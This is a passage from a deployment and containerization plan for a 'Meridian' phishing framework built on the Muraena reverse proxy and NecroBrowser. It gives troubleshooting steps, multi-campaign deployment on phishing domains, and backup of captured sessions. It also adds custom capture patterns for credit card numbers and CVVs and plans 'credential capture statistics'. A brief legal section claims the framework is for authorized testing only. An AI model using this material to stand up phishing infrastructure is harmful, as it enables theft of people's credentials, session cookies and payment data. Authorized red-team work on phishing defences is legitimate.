- Rotate credentials regularly

### 2. SSL/TLS
- Prefer Let's Encrypt for production
- Self-signed only for testing
- Ensure certificates are properly secured (600 permissions)

### 3. Network Security
- Use Docker networks for service isolation
- Expose only necessary ports
- Configure firewall rules on host

### 4. Container Security
- Run containers as non-root users
- Use official base images
- Keep images updated

### 5. Logging
- Sanitize logs to prevent credential leakage
- Implement log rotation
- Secure log file permissions

---

## Troubleshooting Guide

### Issue: DNS not configured
**Solution:**
```bash
# Verify DNS propagation
nslookup your-phishing-domain.com

# If not configured, update DNS records:
# A record: your-phishing-domain.com -> SERVER_IP
```

### Issue: Port already in use
**Solution:**
```bash
# Find process using port
sudo lsof -i :443

# Stop conflicting service
sudo systemctl stop apache2  # or nginx

# Or change port in .env
MURAENA_HTTPS_PORT=8443
```

### Issue: Let's Encrypt fails
**Solution:**
```bash
# Check DNS is configured
nslookup your-domain.com

# Ensure ports 80/443 are accessible
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Try manual certbot
sudo certbot certonly --standalone -d your-domain.com
```

### Issue: Containers won't start
**Solution:**
```bash
# Check logs
docker-compose logs

# Verify configuration
cat config/generated/muraena_config.toml

# Rebuild images
docker-compose build --no-cache
docker-compose up -d
```

### Issue: Redis connection failed
**Solution:**
```bash
# Check Redis is running
docker-compose ps redis

# Test Redis connection
docker-compose exec redis redis-cli -a YOUR_PASSWORD ping

# Check password in configs matches .env
grep REDIS_PASSWORD .env
```

---

## Advanced Configuration

### Custom Muraena Rules

Edit `config/templates/muraena_config.toml.template` to add:

```toml
# Custom tracking patterns
[[tracking.secrets.patterns]]
label = "Credit Card"
start = "cardNumber="
end = "&"

[[tracking.secrets.patterns]]
label = "CVV"
start = "cvv="
end = "&"
```

### Custom NecroBrowser Tasks

Create task files in `necrobrowser/tasks/`:

```json
{
  "name": "custom_task",
  "target": "{{TARGET_DOMAIN}}",
  "actions": [
    {"type": "goto", "url": "https://{{TARGET_DOMAIN}}/login"},
    {"type": "screenshot", "path": "/app/screenshots/login.png"}
  ]
}
```

### Multi-Domain Support

For multiple phishing domains, create separate `.env` files:

```bash
# Deploy campaign 1
cp .env.campaign1 .env
docker-compose -p campaign1 up -d

# Deploy campaign 2
cp .env.campaign2 .env
docker-compose -p campaign2 up -d
```

---

## Monitoring and Maintenance

### Health Checks

```bash
# Check all services
docker-compose ps

# Check specific service health
docker-compose exec muraena curl -f http://localhost/health

# View resource usage
docker stats
```

### Log Management

```bash
# View all logs
docker-compose logs -f

# View specific service
docker-compose logs -f muraena

# Export logs
docker-compose logs > deployment_logs_$(date +%Y%m%d).txt
```

### Backup and Recovery

```bash
# Backup configuration
tar -czf backup_$(date +%Y%m%d).tar.gz \
    .env \
    config/generated/ \
    ssl/

# Backup captured data
docker-compose exec muraena tar -czf /app/backup.tar.gz \
    /app/logs \
    /app/sessions \
    /app/data

# Copy backup from container
docker cp meridian-muraena:/app/backup.tar.gz ./
```

### Updates

```bash
# Pull latest images
docker-compose pull

# Rebuild custom images
docker-compose build --pull

# Restart with new images
docker-compose up -d
```

---

## Migration from Manual Deployment

### Step 1: Backup Current Setup
```bash
# Backup existing configs
cp -r ~/ignition ~/ignition.backup

# Export current credentials
redis-cli --scan > redis_keys.txt
```

### Step 2: Extract Configuration
```bash
# Note current settings
grep "phishing\|destination" ~/ignition/muraena/config/config.toml
```

### Step 3: Run Interactive Deployment
```bash
# Use same values from old config
./deploy-interactive.sh
```

### Step 4: Migrate Data
```bash
# Copy SSL certificates
cp ~/ignition/ssl/*.pem ./ssl/

# Import Redis data (if needed)
docker-compose exec redis redis-cli --pipe < redis_backup.rdb
```

### Step 5: Verify and Switch
```bash
# Test new deployment
curl -I https://your-phishing-domain.com

# Stop old services
cd ~/ignition
./stop-ignition-services.sh

# Remove old installation (after verification)
rm -rf ~/ignition.backup
```

---

## Performance Optimization

### 1. Resource Limits

Add to `docker-compose.yml`:

```yaml
services:
  muraena:
    deploy:
      resources:
        limits:
          cpus: '2'
          memory: 2G
        reservations:
          cpus: '1'
          memory: 1G
```

### 2. Redis Optimization

```yaml
redis:
  command: >
    redis-server
    --appendonly yes
    --requirepass ${REDIS_PASSWORD}
    --maxmemory 512mb
    --maxmemory-policy allkeys-lru
```

### 3. NecroBrowser Scaling

```yaml
necrobrowser:
  deploy:
    replicas: 3
  environment:
    - CLUSTER_MODE=true
```

---

## Compliance and Legal

### Important Notes

1. **Authorization Required**: Only use on systems you own or have explicit permission to test
2. **Educational Purpose**: This framework is for security research and authorized testing
3. **Legal Compliance**: Ensure compliance with local laws and regulations
4. **Responsible Disclosure**: Report vulnerabilities through proper channels
5. **Data Protection**: Handle captured data according to privacy regulations

### Recommended Practices

- Obtain written authorization before deployment
- Implement data retention policies
- Use secure communication channels
- Document all testing activities
- Implement access controls
- Regular security audits

---

## Future Enhancements

### Planned Features

1. **Web-based Configuration UI**
   - Browser-based setup wizard
   - Real-time configuration validation
   - Visual campaign management

2. **Multi-Campaign Management**
   - Deploy multiple campaigns simultaneously
   - Campaign switching and management
   - Resource isolation per campaign

3. **Advanced Analytics**
   - Real-time dashboard
   - Credential capture statistics
   - Geographic tracking
   - Success rate metrics

4. **Automated Testing**
   - Pre-deployment validation suite
   - Integration tests
   - Performance benchmarks

5. **Cloud Provider Integration**
   - AWS deployment automation
   - Azure support
   - GCP support
   - Terraform modules

6. **Enhanced Security**
   - Secrets management with Vault
   - Certificate rotation automation
   - Security scanning integration

---

## Support and Resources

### Documentation
- [Muraena Documentation](https://muraena.io)
- [NecroBrowser Documentation](https://necrobrowser.io)
- [Docker Documentation](https://docs.docker.com)

### Community
- GitHub Issues: Report bugs and request features
- Discord: Community support and discussions

### Professional Support
- Custom deployment assistance
- Security consulting
- Training and workshops

---

## Conclusion

This containerization plan provides a comprehensive, user-friendly approach to deploying the Meridian phishing framework with dynamic configuration. The interactive deployment script guides users through the setup process, validates inputs, generates configurations from templates, and deploys fully containerized services.

### Key Achievements

✅ **Interactive Configuration**: User-friendly prompts for all settings
✅ **Template-Based**: Flexible, maintainable configuration system
✅ **Fully Containerized**: Consistent deployment across environments
✅ **SSL Automation**: Multiple certificate options with automation
✅ **Security-First**: Strong defaults and best practices
✅ **Well-Documented**: Comprehensive guides and examples

### Next Steps

1. Review and approve this plan
2. Create template files
3. Implement interactive deployment script
4. Test deployment process
5. Update documentation
6. Deploy to production

---

**Document Version**: 1.0
**Last Updated**: 2026-01-XX
**Status**: Ready for Implementation
